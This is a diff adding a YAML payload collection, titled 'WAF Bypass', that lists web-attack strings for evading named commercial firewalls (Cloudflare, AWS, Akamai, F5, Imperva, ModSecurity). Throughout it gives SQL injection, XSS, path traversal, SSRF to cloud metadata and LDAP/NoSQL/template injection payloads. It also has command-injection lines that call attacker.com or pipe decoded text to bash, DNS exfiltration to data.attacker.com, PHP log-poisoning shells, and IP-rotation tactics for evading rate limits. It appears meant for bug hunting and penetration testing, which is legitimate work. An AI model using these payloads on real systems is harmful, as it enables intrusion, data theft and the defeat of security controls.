@@ -1,0 +1,656 @@
+name: WAF Bypass
+description: 263 WAF/EDR bypass techniques compiled from src-hunter research.
+categories:
+- name: HTTP Parameter Pollution (HPP)
+  description: Duplicate params to confuse WAF parsers
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - aws
+  payloads:
+  - ?id=1&id=2&id=3
+  - ?id=1&id=2&id=UNION SELECT
+  - ?id=1&id=2&id=1' OR '1'='1
+  - ?param=1&param=1' UNION SELECT--
+  - ?a=1&a=2&a=3&a=4&a=5
+- name: HTTP Parameter Fragmentation (HPF)
+  description: Split payload across multiple params
+  wafs:
+  - cloudflare
+  - aws
+  - imperva
+  payloads:
+  - ?id=1'/*&name=*/UNION SELECT--
+  - ?a=1' UNION/*&b=*/SELECT 1,2--
+  - ?x=1'/*&y=*/AND 1=1--
+- name: HTTP Parameter Contamination (HPC)
+  description: Use different case/encodings for same param
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - ?id=1&ID=1' OR '1'='1
+  - ?id=1&iD=1 UNION SELECT--
+  - ?param=1&PARAM=1'--
+- name: Case Switching
+  description: Mix uppercase/lowercase to bypass regex
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - akamai
+  payloads:
+  - SeLeCt * FrOm users
+  - UnIoN SeLeCt 1,2,3
+  - oR 1=1--
+  - aNd 1=1
+  - oRdEr By 3
+  - aDmIn' --
+- name: URL Encoding
+  description: Single/double/over-encoding to bypass signature detection
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - imperva
+  - akamai
+  payloads:
+  - ''' OR ''1''=''1 (URL encoded once)'
+  - ''' OR ''1''=''1 (double URL encoded)'
+  - ''' OR ''1''=''1 (triple URL encoded)'
+  - SELECT * FROM users
+  - 1' ORDER BY 3--
+- name: Unicode Bypass
+  description: Use Unicode homoglyphs and normalization tricks
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  payloads:
+  - SELECT * FROM users (fullwidth)
+  - OR 1=1 (Cyrillic lookalikes)
+  - UNION SELECT (fullwidth)
+- name: Comment Injection
+  description: Inject SQL comments to truncate or split signatures
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - aws
+  - imperva
+  payloads:
+  - '''/**/OR/**/1=1--'
+  - UN/**/ION SEL/**/ECT 1,2
+  - ''' OR 1=1 #'
+  - 1'/*!50000ORDER*/ BY 3--
+- name: Null Byte Injection
+  description: Null bytes to truncate parsed strings
+  wafs:
+  - cloudflare
+  - akamai
+  - f5
+  payloads:
+  - ''' OR ''1''=''1%00'
+  - admin%00' --
+  - SELECT%00*%00FROM%00users
+- name: Buffer Overflow
+  description: Fill WAF buffer with junk to bypass inspection
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - imperva
+  payloads:
+  - ?id=1 + AAAAA... (8000 chars) + ' OR '1'='1
+  - ?id=AAAA... (4000 chars) + 1' UNION SELECT--
+  - ''' OR ''1''=''1 + &junk= + BBBB... (10000 chars)'
+- name: HTTP Verb Tampering
+  description: Use alternative HTTP methods to bypass
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - akamai
+  payloads:
+  - HEAD instead of POST
+  - PATCH instead of PUT
+  - OPTIONS instead of DELETE
+- name: Content-Type Mutation
+  description: Change Content-Type to bypass parsers
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - imperva
+  payloads:
+  - 'Content-Type: application/x-www-form-urlencoded'
+  - 'Content-Type: multipart/form-data'
+  - 'Content-Type: application/json'
+  - 'Content-Type: text/plain'
+  - 'Content-Type: application/xml'
+- name: Chunked Transfer Encoding
+  description: Use TE chunked to bypass WAF body inspection
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - 'Transfer-Encoding: chunked'
+  - 'Transfer-Encoding: x-chunked'
+- name: HTTP Request Smuggling
+  description: CL.TE / TE.CL smuggling attacks
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - akamai
+  - aws
+  - imperva
+  payloads:
+  - CL.TE content-length + transfer-encoding mismatch
+  - TE.CL transfer-encoding + content-length mismatch
+- name: Line Feed Injection
+  description: Inject CR/LF to split WAF parsing
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  payloads:
+  - 'X-Custom: 1 (CRLF injection)'
+  - 'X-Forwarded-For: 127.0.0.1 (LF injection)'
+- name: Header-Based Injection
+  description: Inject payloads in less-scanned headers
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - imperva
+  payloads:
+  - 'User-Agent: 1'' OR ''1''=''1'
+  - 'Referer: 1 UNION SELECT--'
+  - 'X-Forwarded-For: 1'' OR 1=1--'
+  - 'Cookie: id=1'' OR ''1''=''1'
+- name: JSON Unicodescape
+  description: Use JSON unicode escapes for WAF bypass
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  payloads:
+  - '{"id":"u0027 OR u00271u0027u003du00271"}'
+  - '{"q":"u0055u004eu0049u004fu004e SELECT"}'
+- name: Hex Encoding
+  description: Use hex-encoded values for strings
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - akamai
+  payloads:
+  - 0x27204f5220313d312d2d (hex encoded payload)
+  - '0x61646d696e (hex: admin)'
+  - CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)
+- name: Whitespace Obfuscation
+  description: Use varied whitespace to bypass
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - aws
+  - imperva
+  - f5
+  payloads:
+  - SELECT * FROM users (tabs instead of spaces)
+  - SELECT * FROM users (newlines between keywords)
+  - SELECT * FROM users (multiple spaces)
+- name: Operator Substitution
+  description: Replace = with LIKE, IN, BETWEEN
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - ''' OR 1 LIKE 1--'
+  - ''' OR 1 BETWEEN 0 AND 2--'
+  - ''' OR 1 IS NOT NULL--'
+- name: Logical Operator Substitution
+  description: Replace AND/OR with &&/||
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - akamai
+  payloads:
+  - ''' || 1=1 --'
+  - ''' && 1=1 --'
+- name: Hex IP Bypass
+  description: Use hex/octal IP representations
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - http://0x7f000001/
+  - http://0177.0.0.1/
+  - http://2130706433/
+  - http://0x0A00000F/
+- name: IP Address Obfuscation
+  description: Encode IP addresses to bypass URL filters
+  wafs:
+  - cloudflare
+  - f5
+  - aws
+  - akamai
+  payloads:
+  - http://0x7f000001
+  - http://2130706433
+  - http://0177.0.0.1
+- name: Protocol Obfuscation
+  description: Use alternative protocols
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - file:///etc/passwd
+  - gopher://localhost:9000/
+  - dict://localhost:11211/
+  - ftp://localhost:21/
+  - php://filter/convert.base64-encode/resource=index
+- name: Path Traversal Bypass
+  description: Various path traversal encoding tricks
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  - akamai
+  payloads:
+  - ..%252f..%252f..%252fetc/passwd
+  - ..%c0%af..%c0%af..%c0%afetc/passwd
+  - '....//....//....//etc/passwd'
+  - ..\..\..\windows/win.ini
+- name: XSS Context Bypass
+  description: XSS in different HTML contexts
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - imperva
+  payloads:
+  - <svg onload=alert(1)>
+  - <img src=x onerror=alert(1)>
+  - <body onload=alert(1)>
+  - <input onfocus=alert(1) autofocus>
+  - <details open ontoggle=alert(1)>
+  - <video onloadedmetadata=alert(1)>
+- name: XSS Without Parentheses
+  description: Use backticks or throw to bypass parenthesis filters
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - onerror=alert`1`
+  - onload=alert`1`
+  - onerror=throw 1
+- name: CSP Bypass
+  description: Use JSONP endpoints and known CSP bypasses
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - //google-analytics.com/ga.js
+  - //cdn.jsdelivr.net/npm/angular/angular.min.js
+  - //ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js
+- name: WAF Rate Limiting Bypass
+  description: Rotate headers/IPs to bypass rate limits
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  - aws
+  - imperva
+  - f5
+  payloads:
+  - 'X-Forwarded-For: 127.0.0.1'
+  - 'X-Real-IP: 127.0.0.1'
+  - 'X-Originating-IP: 127.0.0.1'
+  - 'X-Client-IP: 127.0.0.1'
+  - 'X-Host: localhost'
+- name: HTTP Version Downgrade
+  description: Use HTTP/1.0 to bypass HTTP/2 rules
+  wafs:
+  - cloudflare
+  - f5
+  payloads:
+  - HTTP/1.0 request (disables chunked encoding)
+  - HTTP/0.9 simple request (no headers)
+- name: Cloudflare-Specific Bypass
+  description: Techniques specific to Cloudflare
+  wafs:
+  - cloudflare
+  payloads:
+  - CF-Connecting-IP header bypass
+  - Origin IP via shodan/censys
+  - Cloudscraper for JS challenge
+- name: ModSecurity-Specific Bypass
+  description: Techniques specific to ModSecurity
+  wafs:
+  - modsec
+  payloads:
+  - 'Content-Transfer-Encoding: base64'
+  - 'Content-Type: multipart/form-data boundary override'
+- name: AWS WAF-Specific Bypass
+  description: Techniques specific to AWS WAF
+  wafs:
+  - aws
+  payloads:
+  - Exceed 8KB body inspection limit
+  - Query string > 8KB bypass
+  - JSON content-type bypass
+- name: F5 ASM-Specific Bypass
+  description: Techniques specific to F5 ASM
+  wafs:
+  - f5
+  payloads:
+  - HTTP/1.0 request
+  - Non-RFC header usage
+  - Unicode normalization differences
+- name: Akamai-Specific Bypass
+  description: Techniques specific to Akamai
+  wafs:
+  - akamai
+  payloads:
+  - X-Forwarded-For with internal IP
+  - Cache poisoning via Host header
+  - HTTP/2 to HTTP/1.1 rule gap
+- name: Imperva-Specific Bypass
+  description: Techniques specific to Imperva (Incapsula)
+  wafs:
+  - imperva
+  payloads:
+  - X-Forwarded-For bypass
+  - Chunked encoding bypass
+  - Multi-part form data boundary manipulation
+  - HTML Entity encoding bypass
+- name: Command Injection Bypass
+  description: Execute commands without spaces or with encoding
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - cmd=whoami
+  - cmd=cat</etc/passwd
+  - cmd=ls${IFS}-la
+  - cmd=curl${IFS}attacker.com
+  - echo d2hvYW1p | base64 -d | bash
+- name: LFI PHP Wrapper
+  description: PHP wrapper-based file reads
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  payloads:
+  - php://filter/convert.base64-encode/resource=config.php
+  - php://filter/resource=/etc/passwd
+  - php://input
+  - expect://whoami
+- name: SSRF Cloud Metadata
+  description: Cloud metadata endpoints for SSRF
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - f5
+  payloads:
+  - http://169.254.169.254/latest/meta-data/
+  - http://metadata.google.internal/
+  - http://100.100.100.200/latest/meta-data/
+- name: SSRF Internal Services
+  description: Internal service discovery via SSRF
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - http://127.0.0.1:9200/
+  - http://127.0.0.1:6379/
+  - http://127.0.0.1:27017/
+  - http://127.0.0.1:3306/
+- name: GraphQL Injection Bypass
+  description: Inject through GraphQL queries
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  payloads:
+  - '{"query":"query{__typename}"}'
+  - query{user(id:"1 OR 1=1"){name}}
+  - mutation{login(username:"admin",password:{"$gt":""}){token}}
+- name: NoSQL Injection Bypass
+  description: NoSQL injection to bypass JSON validation WAFs
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  payloads:
+  - '{"$gt": ""}'
+  - '{"$ne": ""}'
+  - '{"$regex": ".*"}'
+- name: SSTI Bypass
+  description: Server-Side Template Injection for WAF bypass
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - imperva
+  payloads:
+  - '{{config}}'
+  - '{{7*7}}'
+  - ${7*7}
+  - '#{7*7}'
+- name: LDAP Injection Bypass
+  description: LDAP injection techniques
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  payloads:
+  - '*)(uid=*))(|(uid=*'
+  - '*)(|(password=*))'
+  - admin*)((|userPassword=*)
+- name: SVG Upload Bypass
+  description: XSS through SVG file uploads
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  payloads:
+  - <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+  - <svg onload=alert(1)>
+- name: Form Action Bypass
+  description: Bypass via form action attribute
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - <form action=javascript:alert(1)><button>Click</button></form>
+  - <form id=test><button formaction=javascript:alert(1)>
+- name: WebSocket Bypass
+  description: Use WebSocket to bypass HTTP WAF
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  payloads:
+  - ws://target.com/ws upgrade header
+  - wss://target.com/ws
+- name: HTTP Method Override
+  description: Use X-HTTP-Method-Override to bypass method checks
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  - aws
+  - akamai
+  payloads:
+  - 'X-HTTP-Method-Override: PUT'
+  - 'X-HTTP-Method-Override: DELETE'
+  - 'X-HTTP-Method-Override: PATCH'
+- name: Angular Sandbox Bypass
+  description: Angular template injection for XSS
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - '{{constructor.constructor(''alert(1)'')()}}'
+  - '{{a=''constructor'';b=''constructor'';a[b](''alert(1)'')()}}'
+- name: Vue.js Template Injection
+  description: Vue.js template injection
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - '{{constructor.constructor(''alert(1)'')()}}'
+  - '{{_self.constructor.constructor(''alert(1)'')()}}'
+- name: CORS Bypass
+  description: Bypass CORS restrictions
+  wafs:
+  - cloudflare
+  - aws
+  payloads:
+  - 'Origin: https://evil.com'
+  - 'Origin: null'
+  - 'Origin: https://target.com.evil.com'
+- name: Web Cache Deception
+  description: Trick CDN into caching sensitive data
+  wafs:
+  - cloudflare
+  - akamai
+  payloads:
+  - /api/user/profile/test.css
+  - /api/reports/summary.html
+  - /endpoint/sensitive/test.js
+- name: Data URI Bypass
+  description: Embed payloads in data URIs
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - data:text/html,<script>alert(1)</script>
+  - data:text/html;base64,base64encoded
+- name: JavaScript Protocol Bypass
+  description: 'Use javascript: pseudo-protocol'
+  wafs:
+  - cloudflare
+  - modsec
+  - akamai
+  payloads:
+  - javascript:alert(1)
+  - JAVASCRIPT:alert(1)
+  - java%0ascript:alert(1)
+- name: DNS Rebinding
+  description: Use DNS rebinding to bypass SSRF blocks
+  wafs:
+  - cloudflare
+  - aws
+  payloads:
+  - http://nip.io/169.254.169.254
+  - http://xip.io/127.0.0.1
+  - http://sslip.io/10.0.0.1
+- name: DNS Exfiltration
+  description: Exfiltrate data through DNS
+  wafs:
+  - cloudflare
+  - f5
+  - aws
+  payloads:
+  - nslookup data.attacker.com
+  - dig data.attacker.com TXT
+  - host data.attacker.com
+- name: Out-of-Band Bypass
+  description: OOB techniques for blind vulnerabilities
+  wafs:
+  - cloudflare
+  - modsec
+  - aws
+  - imperva
+  payloads:
+  - http://burpcollaborator.net/test
+  - https://interactsh.com/oob
+- name: Log Poisoning Bypass
+  description: Inject PHP into logs for LFI-to-RCE
+  wafs:
+  - cloudflare
+  - modsec
+  payloads:
+  - 'User-Agent: <?php system(''id''); ?>'
+  - 'Referer: <?php echo shell_exec(''whoami''); ?>'
+- name: Session File Injection
+  description: Inject into session files for LFI
+  wafs:
+  - cloudflare
+  - modsec
+  - f5
+  payloads:
+  - /../../../../tmp/sess_attacker
+  - /../../../var/lib/php/sessions/sess_attacker
+hunting_tactics:
+- name: WAF Fingerprinting
+  description: Identify WAF type/vendor
+  payloads:
+  - Check response headers for WAF signatures
+  - Send known attack patterns and observe block pages
+  - Use wafw00f / WhatWaf tools
+- name: Parallel Request Bypass
+  description: Race condition across multiple WAF nodes
+  payloads:
+  - Send 50+ parallel requests
+  - Use HTTP/2 multiplexing for parallel streams
+- name: IP Rotation
+  description: Rotate source IPs to evade rate limiting
+  payloads:
+  - Use proxy rotating services
+  - AWS Lambda/GCP Functions for IP rotation
+  - VPN rotation across multiple providers
+- name: Timing Attack
+  description: Exploit WAF processing time differences
+  payloads:
+  - Measure block vs pass response times
+  - Identify WAF rules by timing characteristics
+waf_signatures:
+  cloudflare:
+    headers:
+    - CF-RAY
+    - 'Server: cloudflare'
+    block_page: Attention Required
+  modsecurity:
+    headers:
+    - X-Sec-Request-ID
+    block_page: 403 Forbidden
+  aws_waf:
+    headers:
+    - x-amz-id-2
+    - x-amz-request-id
+    block_page: 403 ERROR
+  f5_asm:
+    headers:
+    - X-ASM-Policy
+    - X-ASM-Version
+    block_page: The requested URL was rejected
+  akamai:
+    headers:
+    - X-Akamai-Transformed
+    block_page: 403 Forbidden
+  imperva:
+    headers:
+    - X-Iinfo
+    - 'X-CDN: Incapsula'
+    block_page: Incapsula incident ID
